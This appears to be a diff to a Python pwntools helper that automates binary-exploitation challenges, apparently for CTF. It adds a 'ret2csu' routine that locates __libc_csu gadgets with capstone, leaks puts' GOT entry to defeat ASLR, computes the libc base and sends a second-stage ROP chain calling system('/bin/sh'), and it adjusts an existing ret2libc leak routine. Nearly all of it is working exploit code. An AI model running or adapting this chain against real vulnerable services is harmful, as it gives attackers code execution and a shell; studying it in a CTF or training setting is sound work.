@@ -131,6 +131,85 @@ class _ContactsSession:
             pass
 
 
+def _csu_gadgets(elf):
+    """找 __libc_csu 的 pop 序列与 call [r12+rbx*8] 段，返回寄存器映射。"""
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    text = elf.get_section_by_name(".text")
+    instructions = list(Cs(CS_ARCH_X86, CS_MODE_64).disasm(
+        text.data(), text.header.sh_addr))
+    g1 = None
+    for index in range(len(instructions) - 6):
+        window = instructions[index:index + 7]
+        expected = [("pop", "rbx"), ("pop", "rbp"), ("pop", "r12"),
+                    ("pop", "r13"), ("pop", "r14"), ("pop", "r15"),
+                    ("ret", "")]
+        if all(item.mnemonic == want[0] and item.op_str == want[1]
+               for item, want in zip(window, expected)):
+            g1 = window[0].address
+            break
+    if g1 is None:
+        return None
+    g2 = None
+    mapping = {}
+    for index, instruction in enumerate(instructions):
+        if instruction.mnemonic != "call":
+            continue
+        if "r12" not in instruction.op_str or "rbx" not in instruction.op_str:
+            continue
+        lookback = instructions[max(0, index - 3):index]
+        mapping = {}
+        g2 = None
+        for candidate in lookback:
+            if candidate.mnemonic != "mov":
+                continue
+            dest, _, source = candidate.op_str.partition(",")
+            dest, source = dest.strip(), source.strip()
+            if dest in {"rdx", "rsi", "edi"}:
+                mapping[dest] = source
+                if dest == "rdx":
+                    g2 = candidate.address
+        if {"rdx", "rsi", "edi"} <= set(mapping):
+            break
+        g2 = None
+    if g2 is None:
+        return None
+    return {"g1": g1, "g2": g2, "mapping": mapping}
+
+
+def _main_from_entry(elf):
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    text = elf.get_section_by_name(".text")
+    instructions = list(Cs(CS_ARCH_X86, CS_MODE_64).disasm(
+        text.data(), text.header.sh_addr))
+    libc_start = elf.plt.get("__libc_start_main")
+    if libc_start is None:
+        return None
+    for index, instruction in enumerate(instructions):
+        if instruction.mnemonic != "call":
+            continue
+        if instruction.op_str != hex(libc_start):
+            continue
+        for back in range(1, 8):
+            if index - back < 0:
+                break
+            previous = instructions[index - back]
+            if previous.mnemonic == "mov" and previous.op_str.startswith(("edi,", "rdi,")):
+                value = previous.op_str.split(",", 1)[1].strip()
+                if value.startswith("0x"):
+                    return int(value, 16) | 0x400000 if int(value, 16) < 0x100000 else int(value, 16)
+            if previous.mnemonic == "lea" and "rdi" in previous.op_str:
+                import re as _re
+                match = _re.search(r"rip ([+-]) (0x[0-9a-f]+)", previous.op_str)
+                if match:
+                    offset = int(match.group(2), 16)
+                    if match.group(1) == "-":
+                        offset = -offset
+                    return previous.address + previous.size + offset
+    return None
+
+
 def _contacts_chain(path: str, marker: str) -> dict:
     from pwn import flat
 
@@ -193,6 +272,135 @@ def _handle(request: dict) -> dict:
         return {"ok": False, "error": f"pwntools_unavailable:{IMPORT_ERROR}"}
     op = request.get("op")
     try:
+        if op == "ret2csu":
+            from pwn import ELF, p64, u64
+
+            elf = _elf(request["path"])
+            libc = elf.libc
+            csu = _csu_gadgets(elf)
+            if csu is None:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "csu_gadget_missing"}}
+            reentry_name = request.get("reentry", "main")
+            reentry = elf.symbols.get(reentry_name) or _main_from_entry(elf)
+            puts_plt = elf.plt.get("puts")
+            puts_got = elf.got.get("puts")
+            read_plt = elf.plt.get("read")
+            read_got = elf.got.get("read")
+            if not all((reentry, puts_plt, puts_got, read_plt, read_got)):
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "symbols_missing"}}
+            g1, g2, mapping = csu["g1"], csu["g2"], csu["mapping"]
+            bss = elf.bss() + 0x100
+
+            def csu_call(pointer, rdi, rsi, rdx, after):
+                return (p64(g1) + p64(0) + p64(1) + p64(pointer)
+                        + p64(rdx) + p64(rsi) + p64(rdi & 0xFFFFFFFF)
+                        + p64(g2) + p64(0) * 7 + p64(after))
+
+            offsets = [int(value) for value in request["offsets"]]
+            started = time.perf_counter()
+            debug_log = []
+
+            def open_and_leak(leak_offset):
+                for _attempt in range(4):
+                    io = process(elf.path)
+                    try:
+                        io.recv(timeout=1)
+                        payload = b"A" * leak_offset + csu_call(
+                            puts_got, puts_got, 0, 0, reentry)
+                        # 题目按字节读满 200 次，必须正好 200 字节，否则残留字节会错位
+                        io.send(payload.ljust(200, b"A"))
+                        time.sleep(0.4)
+                        raw = io.recvrepeat(0.6) or b""
+                        leak = 0
+                        for start in range(len(raw)):
+                            for length in (4, 5, 6, 7, 8):
+                                chunk = raw[start:start + length]
+                                if len(chunk) != length:
+                                    continue
+                                value = int.from_bytes(
+                                    chunk.ljust(8, b"\x00"), "little")
+                                if not (0x7F0000000000 <= value <= 0x7FFFFFFFFFFF):
+                                    continue
+                                base = value - libc.symbols["puts"]
+                                if base % 0x1000 == 0 and 0 < base < 0x800000000000:
+                                    leak = value
+                                    break
+                            if leak:
+                                break
+                        debug_log.append(("raw", len(raw), raw[-32:].hex()))
+                        if leak:
+                            return io, leak
+                    except Exception:  # noqa: BLE001
+                        pass
+                    try:
+                        io.close()
+                    except Exception:  # noqa: BLE001
+                        pass
+                return None, 0
+
+            leak_offset = None
+            for candidate in offsets:
+                io = None
+                try:
+                    io, leak = open_and_leak(candidate)
+                    if leak:
+                        leak_offset = candidate
+                        break
+                except Exception:  # noqa: BLE001
+                    continue
+                finally:
+                    if io is not None:
+                        try:
+                            io.close()
+                        except Exception:  # noqa: BLE001
+                            pass
+            if leak_offset is None:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "leak_not_found",
+                                             "debug_log": debug_log[-6:],
+                                             "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+            for stage2_offset in offsets:
+                io = None
+                try:
+                    io, leak = open_and_leak(leak_offset)
+                    debug_log.append(("stage", stage2_offset, hex(leak)))
+                    if not leak:
+                        continue
+                    base = leak - libc.symbols["puts"]
+                    system = base + libc.symbols["system"]
+                    binsh = base + next(iter(libc.search(b"/bin/sh")))
+                    rop_libc = ROP(libc)
+                    pop_rdi = base + rop_libc.find_gadget(["pop rdi", "ret"]).address
+                    ret_gadget = base + rop_libc.find_gadget(["ret"]).address
+                    stage2 = (b"A" * stage2_offset + p64(ret_gadget)
+                              + p64(pop_rdi) + p64(binsh) + p64(system))
+                    # 题目按字节读满 200 次，必须正好喂满 200 字节才会返回
+                    debug_log.append(("pre_send", io.poll()))
+                    io.send(stage2.ljust(200, b"B"))
+                    time.sleep(0.3)
+                    io.send(b"echo PWNED; exit\n")
+                    output = io.recvrepeat(2) or b""
+                    if b"PWNED" in output:
+                        return {"ok": True, "data": {
+                            "solved": True, "offset": stage2_offset,
+                            "leak_offset": leak_offset, "leak": leak,
+                            "system": system,
+                            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+                except Exception as error:  # noqa: BLE001
+                    debug_log.append((stage2_offset, "ERR", type(error).__name__))
+                    continue
+                finally:
+                    if io is not None:
+                        try:
+                            io.close()
+                        except Exception:  # noqa: BLE001
+                            pass
+            return {"ok": True, "data": {"solved": False,
+                                         "error": "stage2_failed",
+                                         "debug_log": debug_log[-6:],
+                                         "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
         if op == "fmtstr_blind_leak":
             path = request["path"]
             count = int(request.get("count", 150))
@@ -455,7 +663,10 @@ def _handle(request: dict) -> dict:
             leak_symbol = request.get("leak_symbol", "puts")
             got = elf.got.get(leak_symbol)
             plt = elf.plt.get(leak_symbol)
-            main = elf.symbols.get("main")
+            reentry = elf.symbols.get(request.get("reentry", "main"))                 or elf.symbols.get("main")
+            main = reentry
+            sync = (bytes.fromhex(request["sync"]) if request.get("sync")
+                    else b"!?")
             if got is None or plt is None or main is None:
                 return {"ok": True, "data": {"solved": False,
                                              "error": "leak_symbol_missing"}}
@@ -468,10 +679,10 @@ def _handle(request: dict) -> dict:
 
             def open_and_leak(leak_offset: int):
                 io = process(elf.path, aslr=bool(request.get("aslr", True)))
-                io.recvuntil(b"!?", timeout=2)
+                io.recvuntil(sync, timeout=3)
                 payload = b"A" * leak_offset + pack(plt) + pack(main) + pack(got)
                 io.sendline(payload)
-                raw = io.recvuntil(b"\n", timeout=2) or b""
+                raw = io.recvuntil(sync, timeout=3) or b""
                 leak = 0
                 for start in range(0, max(0, len(raw) - width + 1), 1):
                     value = unpack(raw[start:start + width])
@@ -481,6 +692,7 @@ def _handle(request: dict) -> dict:
                     if base % 0x1000 == 0 and 0 < base < 0x100000000:
                         leak = value
                         break
+                debug_log.append(("raw", len(raw), raw[-40:].hex()))
                 return io, leak
 
             # 第一遍：找能成功泄漏的偏移
@@ -523,7 +735,6 @@ def _handle(request: dict) -> dict:
                         return {"ok": True, "data": {"solved": False,
                                                      "error": "binsh_missing"}}
                     shell += base
-                    io.recvuntil(b"!?", timeout=2)
                     stage2 = b"A" * stage2_offset + pack(system) + pack(0) + pack(shell)
                     io.sendline(stage2)
                     time.sleep(0.2)
